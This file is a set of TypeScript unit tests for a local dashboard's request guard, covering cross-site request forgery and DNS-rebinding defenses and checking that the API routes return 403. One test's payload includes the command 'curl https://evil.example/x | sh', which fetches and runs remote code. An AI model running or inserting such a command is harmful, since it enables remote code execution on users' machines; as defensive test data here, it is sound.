import { describe, test, expect } from 'bun:test';
import {
  checkSameOrigin,
  rejectCrossOrigin,
  checkHost,
  isAllowedHost,
  rejectUntrustedHost,
} from '../lib/request-guard';
import { POST as shipPost } from '../app/api/ship/route';
import { POST as briefPost } from '../app/api/brief/route';
import { GET as eventsGet } from '../app/api/events/route';
import { GET as graphGet } from '../app/api/graph/route';

const h = (o: Record<string, string>) => new Headers(o);

describe('checkSameOrigin', () => {
  test('same-origin browser fetch (what BriefMePane sends) is allowed', () => {
    expect(checkSameOrigin(h({
      host: 'localhost:3000',
      origin: 'http://localhost:3000',
      'sec-fetch-site': 'same-origin',
    })).ok).toBe(true);
  });

  test('direct navigation (sec-fetch-site=none) is allowed', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', 'sec-fetch-site': 'none' })).ok).toBe(true);
  });

  test('non-browser client with no Origin / Sec-Fetch-Site is allowed', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000' })).ok).toBe(true);
  });

  test('cross-site request is rejected via sec-fetch-site', () => {
    const r = checkSameOrigin(h({
      host: 'localhost:3000',
      origin: 'https://evil.example',
      'sec-fetch-site': 'cross-site',
    }));
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/cross-site/);
  });

  test('same-site (sibling subdomain) is still rejected', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', 'sec-fetch-site': 'same-site' })).ok).toBe(false);
  });

  test('Origin mismatch is rejected when sec-fetch-site is absent (older browsers)', () => {
    const r = checkSameOrigin(h({ host: 'localhost:3000', origin: 'https://evil.example' }));
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/does not match/);
  });

  test('Origin matching Host (including port) is allowed without sec-fetch-site', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', origin: 'http://localhost:3000' })).ok).toBe(true);
    expect(checkSameOrigin(h({ host: '127.0.0.1:3000', origin: 'http://127.0.0.1:3000' })).ok).toBe(true);
  });

  test('same hostname on a different port is rejected', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', origin: 'http://localhost:8080' })).ok).toBe(false);
  });

  test('Origin "null" (sandboxed iframe / file://) is rejected', () => {
    expect(checkSameOrigin(h({ host: 'localhost:3000', origin: 'null' })).ok).toBe(false);
  });

  test('Origin present but Host missing is rejected', () => {
    expect(checkSameOrigin(h({ origin: 'http://localhost:3000' })).ok).toBe(false);
  });
});

describe('rejectCrossOrigin', () => {
  test('returns null for an allowed request', () => {
    const req = new Request('http://localhost:3000/api/ship', {
      method: 'POST',
      headers: { host: 'localhost:3000', 'sec-fetch-site': 'same-origin' },
    });
    expect(rejectCrossOrigin(req)).toBeNull();
  });

  test('returns a 403 JSON response for a cross-site request', async () => {
    const req = new Request('http://localhost:3000/api/ship', {
      method: 'POST',
      headers: { host: 'localhost:3000', origin: 'https://evil.example', 'sec-fetch-site': 'cross-site' },
    });
    const res = rejectCrossOrigin(req);
    expect(res).not.toBeNull();
    expect(res!.status).toBe(403);
    const body = await res!.json();
    expect(body.error).toMatch(/forbidden/);
  });
});

describe('route handlers refuse cross-site POSTs before doing anything', () => {
  // A "simple" cross-site request: text/plain body, no preflight. This is
  // exactly what a malicious page can send to localhost:3000.
  const evil = (path: string, body: string) => new Request(`http://localhost:3000${path}`, {
    method: 'POST',
    headers: {
      host: 'localhost:3000',
      origin: 'https://evil.example',
      'sec-fetch-site': 'cross-site',
      'content-type': 'text/plain',
    },
    body,
  });

  test('POST /api/ship with attacker-chosen repo_path + command is rejected with 403', async () => {
    const res = await shipPost(evil('/api/ship', JSON.stringify({
      slug: 'people/alice-example',
      repo_path: '/Users/victim/repo',
      command: 'curl https://evil.example/x | sh',
    })));
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toMatch(/forbidden/);
  });

  test('POST /api/brief from a foreign origin is rejected with 403', async () => {
    const res = await briefPost(evil('/api/brief', ''));
    expect(res.status).toBe(403);
  });
});

describe('DNS rebinding: Host must be a loopback name', () => {
  // A page served from http://evil.example:3000 whose DNS answer is flipped to
  // 127.0.0.1 reaches this server with Host, Origin and Sec-Fetch-Site that
  // all look same-origin. The only tell is that Host is not a loopback name.
  const rebound = {
    host: 'evil.example:3000',
    origin: 'http://evil.example:3000',
    'sec-fetch-site': 'same-origin',
  };

  test('checkHost rejects a non-loopback Host', () => {
    const r = checkHost(h({ host: 'evil.example:3000' }));
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/not loopback/);
  });

  test('checkSameOrigin rejects a rebound request even though Origin matches Host', () => {
    const r = checkSameOrigin(h(rebound));
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/not loopback/);
  });

  test('checkSameOrigin rejects a rebound request that looks like a non-browser client', () => {
    expect(checkSameOrigin(h({ host: 'evil.example:3000' })).ok).toBe(false);
  });

  test('loopback hosts are allowed, with or without a port, any case', () => {
    for (const host of [
      'localhost',
      'localhost:3000',
      'LOCALHOST:3000',
      '127.0.0.1:3000',
      '[::1]:3000',
      '0.0.0.0:3000',
      'hud.localhost:3000',
    ]) {
      expect(isAllowedHost(host)).toBe(true);
    }
  });

  test('public, LAN, and lookalike hosts are not allowed', () => {
    for (const host of [
      'evil.example',
      'evil.example:3000',
      '192.168.1.10:3000',
      '10.0.0.5',
      'localhost.evil.example:3000',
      '127.0.0.1.evil.example',
      'localhost.:3000',
      '',
    ]) {
      expect(isAllowedHost(host)).toBe(false);
    }
  });

  test('GSTACK_HUD_ALLOWED_HOSTS opt-in allows exactly the listed hostnames', () => {
    expect(isAllowedHost('hud.lan:3000', 'hud.lan, other.lan')).toBe(true);
    expect(isAllowedHost('OTHER.LAN', 'hud.lan, other.lan')).toBe(true);
    expect(isAllowedHost('evil.example:3000', 'hud.lan, other.lan')).toBe(false);
    expect(isAllowedHost('hud.lan:3000', '')).toBe(false);
  });

  test('missing Host header is rejected', () => {
    expect(checkHost(h({})).ok).toBe(false);
  });

  test('rejectUntrustedHost returns null for loopback and 403 otherwise', async () => {
    const good = new Request('http://localhost:3000/api/graph', { headers: { host: 'localhost:3000' } });
    expect(rejectUntrustedHost(good)).toBeNull();
    const bad = new Request('http://evil.example:3000/api/graph', { headers: { host: 'evil.example:3000' } });
    const res = rejectUntrustedHost(bad);
    expect(res!.status).toBe(403);
    expect((await res!.json()).error).toMatch(/forbidden/);
  });
});

describe('route handlers refuse a rebound Host', () => {
  const rebound = (path: string, init: RequestInit = {}) =>
    new Request(`http://evil.example:3000${path}`, {
      ...init,
      headers: {
        host: 'evil.example:3000',
        origin: 'http://evil.example:3000',
        'sec-fetch-site': 'same-origin',
        ...(init.headers as Record<string, string> | undefined),
      },
    });

  test('POST /api/ship with a rebound Host is rejected with 403', async () => {
    const res = await shipPost(rebound('/api/ship', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ slug: 'people/alice-example', repo_path: '/Users/victim/repo' }),
    }));
    expect(res.status).toBe(403);
  });

  test('POST /api/brief with a rebound Host is rejected with 403', async () => {
    const res = await briefPost(rebound('/api/brief', { method: 'POST' }));
    expect(res.status).toBe(403);
  });

  test('GET /api/events (streams session tool inputs) with a rebound Host is rejected with 403', () => {
    const res = eventsGet(rebound('/api/events'));
    expect(res.status).toBe(403);
  });

  test('GET /api/graph with a rebound Host is rejected with 403', async () => {
    const res = await graphGet(rebound('/api/graph?limit=10'));
    expect(res.status).toBe(403);
  });

  test('GET /api/events from the dashboard page itself still streams', async () => {
    const res = eventsGet(new Request('http://localhost:3000/api/events', {
      headers: { host: 'localhost:3000', 'sec-fetch-site': 'same-origin' },
    }));
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toBe('text/event-stream');
    // Cancel so the heartbeat interval does not keep the runner alive.
    await res.body!.cancel();
  });
});
